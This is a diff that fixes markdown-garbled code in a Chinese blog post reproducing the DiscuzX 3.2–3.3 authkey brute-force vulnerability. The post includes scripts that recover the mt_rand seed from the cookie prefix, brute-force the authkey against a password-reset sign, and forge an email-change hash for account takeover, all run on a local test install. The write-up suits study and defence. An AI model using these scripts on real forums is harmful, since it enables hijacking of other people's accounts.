@@ -15,7 +15,7 @@ title: DiscuzX3.3 authkey可爆破漏洞复现
 ## 前言
 
 
-在看了一个师傅写的 _`DiscuzX authkey安全性漏洞分析`_文章后，对其中的某些点还是有些模糊，于是决定下载DiscuzX3.3将authkey可爆破漏洞复现下，尽可能的说清楚复现的每一步及其利用的工具和脚本。
+在看了一个师傅写的 `Discuz_X authkey安全性漏洞分析`文章后，对其中的某些点还是有些模糊，于是决定下载DiscuzX3.3将authkey可爆破漏洞复现下，尽可能的说清楚复现的每一步及其利用的工具和脚本。
 
 
 ## 漏洞详情
@@ -26,18 +26,18 @@ title: DiscuzX3.3 authkey可爆破漏洞复现
 
 漏洞影响版本：
 
-- Discuz_X3.3__SCGBK_
-- Discuz_X3.3__SCUTF8_
-- Discuz_X3.3__TCBIG5_
-- Discuz_X3.3__TCUTF8_
-- Discuz_X3.2__SCGBK_
-- Discuz_X3.2__SCUTF8_
-- Discuz_X3.2__TCBIG5_
-- Discuz_X3.2__TCUTF8_
-- Discuz_X2.5__SCGBK_
-- Discuz_X2.5__SCUTF8_
-- Discuz_X2.5__TCBIG5_
-- Discuz_X2.5__TCUTF8_
+- Discuz_X3.3_SC_GBK
+- Discuz_X3.3_SC_UTF8
+- Discuz_X3.3_TC_BIG5
+- Discuz_X3.3_TC_UTF8
+- Discuz_X3.2_SC_GBK
+- Discuz_X3.2_SC_UTF8
+- Discuz_X3.2_TC_BIG5
+- Discuz_X3.2_TC_UTF8
+- Discuz_X2.5_SC_GBK
+- Discuz_X2.5_SC_UTF8
+- Discuz_X2.5_TC_BIG5
+- Discuz_X2.5_TC_UTF8
 
 ## 漏洞分析
 
@@ -74,51 +74,51 @@ function random($length) {
 	$hash = '';
 	$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
 	$max = strlen($chars) - 1;
-	PHP_VERSION < '4.2.0' && mt__srand((double)microtime()  1000000);
-	for(_$i = 0; $i < $length; $i++) {
-		$hash .= $_chars[mtrand(0, $max)];
+	PHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);
+	for($i = 0; $i < $length; $i++) {
+		$hash .= $chars[mt_rand(0, $max)];
 	}
 	return $hash;
-}_
+}
 
 ```
 
 
-可以看到当PHP版本>=4.2时，_`mtrand`_的随机数种子是固定的。现在的思路是计算随机数种子，使用随机数种子生成 `authkey`，找到可以验证`authkey`是否正确的接口，爆破得出`authkey`。很幸运的是Discuz有很多地方使用到了`authkey`来生成一些信息，利用这点就可以验证`authkey`的正确性，这个我们后面会提到。
+可以看到当PHP版本>=4.2时，`mt_rand`的随机数种子是固定的。现在的思路是计算随机数种子，使用随机数种子生成 `authkey`，找到可以验证`authkey`是否正确的接口，爆破得出`authkey`。很幸运的是Discuz有很多地方使用到了`authkey`来生成一些信息，利用这点就可以验证`authkey`的正确性，这个我们后面会提到。
 
 
-### _关于mtrand_
+### 关于mt_rand
 
 
-> _mtrand() 函数使用 Mersenne Twister 算法生成随机整数。  
+> mt_rand() 函数使用 Mersenne Twister 算法生成随机整数。  
 > 该函数是产生随机值的更好选择，返回结果的速度是 rand() 函数的 4 倍。  
-> 如果您想要一个介于 10 和 100 之间（包括 10 和 100）的随机整数，请使用 mtrand (10,100)。_
+> 如果您想要一个介于 10 和 100 之间（包括 10 和 100）的随机整数，请使用 mt_rand (10,100)。
 
 
 语法：
 
 
 ```php
-_mtrand();
+mt_rand();
 or
-mtrand(min,max);_
+mt_rand(min,max);
 
 ```
 
 
-ok，了解了_`mtrand`_函数的用法后，我们使用_`mtrand`_来生成10个1-100之间的随机数：
+ok，了解了`mt_rand`函数的用法后，我们使用`mt_rand`来生成10个1-100之间的随机数：
 
 
 代码如下：
 
 
 ```php
-_<?php
-mtsrand(12345);
-for(_$i=0;$_i<10;$i++){
-echo (mtrand(1,100));
-echo ("\n");
-}_
+<?php
+mt_srand(12345);
+for($i=0;$i<10;$i++){
+echo (mt_rand(1,100));
+echo ("\\n");
+}
 
 ```
 
@@ -135,20 +135,20 @@ echo ("\n");
 ![2020%2005%2013%2015%2036%2020.png](../post_images/2f021db6b419c88e7a65fd17befb4f57.png)
 
 
-可以看到两次运行产生的随机数竟然是一样的，我们把这个称为伪“随机数”，正是由于_`mtrand`_函数的这种特性，我们才可以进行随机数的预测，关于"伪随机数"的详细介绍可以看看下面这两篇文章：
+可以看到两次运行产生的随机数竟然是一样的，我们把这个称为伪“随机数”，正是由于`mt_rand`函数的这种特性，我们才可以进行随机数的预测，关于"伪随机数"的详细介绍可以看看下面这两篇文章：
 
 - [PHP中的随机数安全问题](https://zhuanlan.zhihu.com/p/62555467)
-- [_PHP mtrand()随机数安全_](https://xz.aliyun.com/t/31)
+- [PHP mt_rand()随机数安全](https://xz.aliyun.com/t/31)
 
 ### 爆破随机数种子
 
 
-ok，了解了_`mtrand`_函数后，需要做的就是爆破出随机数种子，在`/install/index.php`中可看到cookie的前缀的前四位也是由`random`函数生成的，而cookie我们是可以看到的：
+ok，了解了`mt_rand`函数后，需要做的就是爆破出随机数种子，在`/install/index.php`中可看到cookie的前缀的前四位也是由`random`函数生成的，而cookie我们是可以看到的：
 
 
 ```php
 $_config['cookie']['cookiepre'] = random(4).'_';
-$
+
 ```
 
 
@@ -161,16 +161,16 @@ cookie前缀为：CHFV
 那我们就可以使用字符集加上4位已知字符，爆破随机数种子,爆破随机数种子的工具已经有人写出，地址为：[https://www.openwall.com/php_mt_seed/](https://www.openwall.com/php_mt_seed/)，关于此工具的使用方法可自行查阅。
 
 
-首先使用脚本生成用于_`phpmtseed`_工具的参数：
+首先使用脚本生成用于`php_mt_seed`工具的参数：
 
 
 ```python
-_# coding=utf-8
-wlen = 10
+# coding=utf-8
+w_len = 10
 result = ""
-strlist = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"
-length = len(strlist)
-for i in xrange(wlen):
+str_list = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"
+length = len(str_list)
+for i in xrange(w_len):
 	result+="0 "
 	result+=str(length-1)
 	result+=" "
@@ -179,14 +179,14 @@ for i in xrange(wlen):
 	result+=" "
 sstr = "CHFV"
 for i in sstr:
-	result+=str(strlist.index(i))
+	result+=str(str_list.index(i))
 	result+=" "
-	result+=str(strlist.index(i))
+	result+=str(str_list.index(i))
 	result+=" "
 	result+="0 "
 	result+=str(length-1)
 	result+=" "
-print result_
+print result
 
 ```
 
@@ -221,28 +221,28 @@ function random($length) {
 	$hash = '';
 	$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
 	$max = strlen($chars) - 1;
-	PHP_VERSION < '4.2.0' && mt__srand((double)microtime()  1000000);
-	for(_$i = 0; $i < $length; $i++) {
-		$hash .= $_chars[mtrand(0, $max)];
+	PHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);
+	for($i = 0; $i < $length; $i++) {
+		$hash .= $chars[mt_rand(0, $max)];
 	}
 	return $hash;
 }
 $fp = fopen('result1.txt', 'r');
 $fp2 = fopen('result2.txt', 'a');
-while(!feof($fp)){_
-	$b = fgets($_fp, 4096);
-	if(pregmatch("/([=\s].[=\s])(\d+)[\s]/",_ $b, $matach)){
-		$m = $_matach[2];
+while(!feof($fp)){
+	$b = fgets($fp, 4096);
+	if(preg_match("/([=\\s].*[=\\s])(\\d+)[\\s]/", $b, $matach)){
+		$m = $matach[2];
 	}else{
 		continue;
 	}
-	// vardump($matach);
-	// vardump($m);
-	mtsrand($m);
-	fwrite($fp2, random(10)."\n");
+	// var_dump($matach);
+	// var_dump($m);
+	mt_srand($m);
+	fwrite($fp2, random(10)."\\n");
 }
 fclose($fp);
-fclose($fp2);_
+fclose($fp2);
 
 ```
 
@@ -253,13 +253,13 @@ fclose($fp2);_
 ![2020%2005%2013%2019%2016%2059.png](../post_images/0836a271020f6efb103ac1de6e2968a9.png)
 
 
-把目光转移到代码中，寻找sign值的生成方式，在_`/source/module/member/memberlostpassw.php`_有如下代码：
+把目光转移到代码中，寻找sign值的生成方式，在`/source/module/member/member_lostpassw.php`有如下代码：
 
 
 ![2020%2005%2013%2019%2020%2011.png](../post_images/ebc6f15ea29b3773382c04831548c6af.png)
 
 
-跟进到_`makegetpwssign`_函数中：
+跟进到`make_getpws_sign`函数中：
 
 
 ![2020%2005%2013%2019%2021%2047.png](../post_images/404001542b35b551cc69ff4743f0b0ba.png)
@@ -275,35 +275,35 @@ fclose($fp2);_
 
 
 ```python
-_#coding: utf-8
+#coding: utf-8
 import itertools
 import hashlib
 import time
 def dsign(authkey):
-	url = "http://127.0.0.1/dz3.3/"
+	url = "<http://127.0.0.1/dz3.3/>"
 	idstring = "xZhQzV"
 	uid = 2
 	uurl = "{}member.php?mod=getpasswd&uid={}&id={}".format(url, uid, idstring)
-	urlmd5 = hashlib.md5(uurl+authkey)
-	return urlmd5.hexdigest()[:16]
+	url_md5 = hashlib.md5(uurl+authkey)
+	return url_md5.hexdigest()[:16]
 def main():
 	sign = "6e2b1a0bb563da89"
-	strlist = "0123456789abcdef"
+	str_list = "0123456789abcdef"
 	with open('result2.txt') as f:
 		ranlist = [s[:-1] for s in f]
-	slist = sorted(set(ranlist), key=ranlist.index)
-	r__list = itertools.product(str__list, repeat=6)
+	s_list = sorted(set(ranlist), key=ranlist.index)
+	r_list = itertools.product(str_list, repeat=6)
 	print "[!] start running...."
-	stime = time.time()
-	for j in rlist:
-		for s in slist:
+	s_time = time.time()
+	for j in r_list:
+		for s in s_list:
 			prefix = "".join(j)
 			authkey = prefix + s
 			# print dsign(authkey)
 			if dsign(authkey) == sign:
-				print "[] found used time: " + str(time.time() - stime)
-				return "[] authkey found: " + authkey
-print main()_
+				print "[*] found used time: " + str(time.time() - s_time)
+				return "[*] authkey found: " + authkey
+print main()
 
 ```
 
@@ -335,7 +335,7 @@ print main()_
 可以看到重置链接中最重要的是hash的参数值，有了这个hash值就可以重置邮件地址了。
 
 
-回到代码_`/source/include/misc/miscemailcheck.php`_中，这个文件是验证重置邮件链接中hash值的：
+回到代码`/source/include/misc/misc_emailcheck.php`中，这个文件是验证重置邮件链接中hash值的：
 
 
 贴一段主要的代码：
@@ -344,48 +344,48 @@ print main()_
 ```php
 <?php
 
-/
-       _[Discuz!] (C)2001-2099 Comsenz Inc.
-       This is NOT a freeware, use is subject to license terms_
- 
-       $Id: misc_emailcheck.php 33688 2013-08-02 03:00:15Z nemohou $
- _/
+/**
+ *      [Discuz!] (C)2001-2099 Comsenz Inc.
+ *      This is NOT a freeware, use is subject to license terms
+ *
+ *      $Id: misc_emailcheck.php 33688 2013-08-02 03:00:15Z nemohou $
+ */
 
-if(!defined('INDISCUZ')) {
+if(!defined('IN_DISCUZ')) {
 	exit('Access Denied');
 }
 
 $uid = 0;
-$email = '';_
-$_GET['hash'] = empty($_GET['hash']) ? '' : $__GET['hash'];
-if($GET['hash']) {
-	list(_$uid, $email, $time) = explode("\t", authcode($_GET['hash'], 'DECODE', md5(substr(md5($_G['config']['security']['authkey']), 0, 16))));
+$email = '';
+$_GET['hash'] = empty($_GET['hash']) ? '' : $_GET['hash'];
+if($_GET['hash']) {
+	list($uid, $email, $time) = explode("\\t", authcode($_GET['hash'], 'DECODE', md5(substr(md5($_G['config']['security']['authkey']), 0, 16))));
 	$uid = intval($uid);
 }
 
 if($uid && isemail($email) && $time > TIMESTAMP - 86400) {
 	$member = getuserbyuid($uid);
-	$setarr = array('email'=>$_email, 'emailstatus'=>'1');
-	if($G['member']['freeze'] == 2) {
+	$setarr = array('email'=>$email, 'emailstatus'=>'1');
+	if($_G['member']['freeze'] == 2) {
 		$setarr['freeze'] = 0;
 	}
-	loaducenter();_
+	loaducenter();
 	$ucresult = uc_user_edit(addslashes($member['username']), '', '', $email, 1);
 	if($ucresult == -8) {
-		showmessage('email_check__accountinvalid', '', array(), array('return' => true));
+		showmessage('email_check_account_invalid', '', array(), array('return' => true));
 	} elseif($ucresult == -4) {
-		showmessage('profile__email_illegal', '', array(), array('return' => true));
+		showmessage('profile_email_illegal', '', array(), array('return' => true));
 	} elseif($ucresult == -5) {
-		showmessage('profile_email__domainillegal', '', array(), array('return' => true));
+		showmessage('profile_email_domain_illegal', '', array(), array('return' => true));
 	} elseif($ucresult == -6) {
-		showmessage('profile__email_duplicate', '', array(), array('return' => true));
+		showmessage('profile_email_duplicate', '', array(), array('return' => true));
 	}
 	if($_G['setting']['regverify'] == 1 && $member['groupid'] == 8) {
 		$membergroup = C::t('common_usergroup')->fetch_by_credits($member['credits']);
-		$setarr['groupid'] = $_membergroup['groupid'];
+		$setarr['groupid'] = $membergroup['groupid'];
 	}
 	updatecreditbyaction('realemail', $uid);
-	C::t('commonmember')->update(_$uid, $setarr);
+	C::t('common_member')->update($uid, $setarr);
 	C::t('common_member_validate')->delete($uid);
 	dsetcookie('newemail', "", -1);
 
@@ -407,19 +407,19 @@ if($uid && isemail($email) && $time > TIMESTAMP - 86400) {
 
 
 ```php
-function authcode($string, $operation = 'DECODE', $key = '', $_expiry = 0) {
+function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
 
-	$ckeylength = 4;_
+	$ckey_length = 4;
 
-	$key = md5($_key ? $key : UCKEY);_
+	$key = md5($key ? $key : UC_KEY);
 	$keya = md5(substr($key, 0, 16));
 	$keyb = md5(substr($key, 16, 16));
-	$keyc = $_ckeylength ? (_$operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$_ckeylength)) : '';_
+	$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
 
 	$cryptkey = $keya.md5($keya.$keyc);
 	$key_length = strlen($cryptkey);
 
-	$string = $_operation == 'DECODE' ? base64decode(substr(_$string, $_ckeylength)) : sprintf('%010d',_ $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
+	$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
 	$string_length = strlen($string);
 
 	$result = '';
@@ -427,10 +427,10 @@ function authcode($string, $operation = 'DECODE', $key = '', $_expiry = 0) {
 
 	$rndkey = array();
 	for($i = 0; $i <= 255; $i++) {
-		$rndkey[$i] = ord($cryptkey[$_i % $keylength]);
+		$rndkey[$i] = ord($cryptkey[$i % $key_length]);
 	}
 
-	for(_$j = $i = 0; $i < 256; $i++) {
+	for($j = $i = 0; $i < 256; $i++) {
 		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
 		$tmp = $box[$i];
 		$box[$i] = $box[$j];
@@ -458,7 +458,7 @@ function authcode($string, $operation = 'DECODE', $key = '', $_expiry = 0) {
 
 }
 
-echo authcode("3\ttest@test.com\t1593556905", 'ENCODE', md5(substr(md5("c0dc85pjkmNEfXuw"), 0, 16)));
+echo authcode("3\\ttest@test.com\\t1593556905", 'ENCODE', md5(substr(md5("c0dc85pjkmNEfXuw"), 0, 16)));
 
 ```
 
@@ -483,6 +483,6 @@ echo authcode("3\ttest@test.com\t1593556905", 'ENCODE', md5(substr(md5("c0dc85pj
 
 ## 参考
 
-- [_DiscuzX authkey安全性漏洞分析_](https://lorexxar.cn/2017/08/31/dz-authkey/)
+- [Discuz_X authkey安全性漏洞分析](https://lorexxar.cn/2017/08/31/dz-authkey/)
 - [Discuz X3.3补丁安全分析](https://www.anquanke.com/post/id/86679)
 - [这是一篇“不一样”的真实渗透测试案例分析文章](https://paper.seebug.org/1144/)
